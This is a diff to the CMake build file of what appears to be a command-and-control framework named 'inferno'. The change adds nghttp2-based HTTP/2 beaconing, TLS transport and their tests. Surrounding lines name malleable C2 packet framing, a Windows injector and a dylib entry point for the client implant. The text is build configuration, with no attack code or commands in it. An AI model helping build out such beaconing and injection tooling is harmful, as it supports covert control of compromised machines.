@@ -20,6 +20,19 @@ endif()
 find_package(OpenSSL REQUIRED)
 
 # ==========================================
+# 2b. nghttp2 (Phase 5A — HTTP/2 Beaconing)
+# ==========================================
+find_path(NGHTTP2_INCLUDE_DIR nghttp2/nghttp2.h)
+find_library(NGHTTP2_LIBRARY nghttp2)
+if(NGHTTP2_INCLUDE_DIR AND NGHTTP2_LIBRARY)
+    set(NGHTTP2_FOUND TRUE)
+    message(STATUS "nghttp2 found: ${NGHTTP2_INCLUDE_DIR}")
+else()
+    message(WARNING "nghttp2 not found — HTTP/2 transport disabled. "
+                    "Install: brew install nghttp2 / apt install libnghttp2-dev")
+endif()
+
+# ==========================================
 # 3. Qt Dependencies (Circle 4)
 # ==========================================
 set(CMAKE_AUTOMOC ON)
@@ -35,9 +48,15 @@ add_library(inferno_common STATIC
     common/src/Socket.cpp
     common/src/Packet.cpp
     common/src/CryptoContext.cpp
+    common/src/TlsTransport.cpp
 )
 target_include_directories(inferno_common PUBLIC common/include)
-target_link_libraries(inferno_common PUBLIC OpenSSL::Crypto)
+target_link_libraries(inferno_common PUBLIC OpenSSL::Crypto OpenSSL::SSL)
+if(NGHTTP2_FOUND)
+    target_include_directories(inferno_common PUBLIC ${NGHTTP2_INCLUDE_DIR})
+    target_link_libraries(inferno_common PUBLIC ${NGHTTP2_LIBRARY})
+    target_compile_definitions(inferno_common PRIVATE INFERNO_HAVE_NGHTTP2)
+endif()
 
 # ==========================================
 # 3. Server Executable
@@ -75,6 +94,14 @@ add_executable(inferno_server
     server/include/services/IntelAnalysisService.hpp
     server/resources/styles.qrc
 )
+if(NGHTTP2_FOUND)
+    target_sources(inferno_server PRIVATE
+        server/src/network/Http2Server.cpp
+        server/include/network/Http2Server.hpp
+    )
+    target_include_directories(inferno_server PRIVATE ${NGHTTP2_INCLUDE_DIR})
+    target_link_libraries(inferno_server PRIVATE ${NGHTTP2_LIBRARY})
+endif()
 target_link_libraries(inferno_server PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
 if(WIN32)
     target_link_libraries(inferno_server PRIVATE ws2_32)
@@ -93,6 +120,15 @@ add_executable(inferno_client
     client/src/entry_dylib.cpp
     client/src/EntitlementScanner.cpp
 )
+if(NGHTTP2_FOUND)
+    target_sources(inferno_client PRIVATE
+        client/src/Http2Client.cpp
+    )
+    target_include_directories(inferno_client PRIVATE
+        ${CMAKE_SOURCE_DIR}
+        ${NGHTTP2_INCLUDE_DIR}
+    )
+endif()
 if(WIN32)
     target_sources(inferno_client PRIVATE
         client/src/WindowsInjector.cpp
@@ -201,6 +237,34 @@ target_link_libraries(inferno_malleable_test PRIVATE
     inferno_common OpenSSL::Crypto
 )
 add_test(NAME MalleablePacket COMMAND inferno_malleable_test)
+
+# HTTP/2 Transport Tests (Phase 5A — requires nghttp2)
+if(NGHTTP2_FOUND)
+    add_executable(inferno_http2_transport_test
+        tests/http2_transport_test.cpp
+    )
+    target_sources(inferno_http2_transport_test PRIVATE
+        client/src/Http2Client.cpp
+    )
+    target_include_directories(inferno_http2_transport_test PRIVATE
+        common/include
+        client/include
+        server/include
+        ${NGHTTP2_INCLUDE_DIR}
+        ${CMAKE_SOURCE_DIR}
+    )
+    target_link_libraries(inferno_http2_transport_test PRIVATE
+        inferno_common ${NGHTTP2_LIBRARY} OpenSSL::SSL OpenSSL::Crypto
+    )
+    if(APPLE)
+        target_link_libraries(inferno_http2_transport_test PRIVATE pthread)
+    endif()
+    if(WIN32)
+        target_link_libraries(inferno_http2_transport_test PRIVATE ws2_32)
+    endif()
+    target_compile_definitions(inferno_http2_transport_test PRIVATE INFERNO_TESTING)
+    add_test(NAME Http2Transport COMMAND inferno_http2_transport_test)
+endif()
 
 # Socket Integration Tests (malleable C2 framing through real loopback sockets)
 add_executable(inferno_socket_integration_test
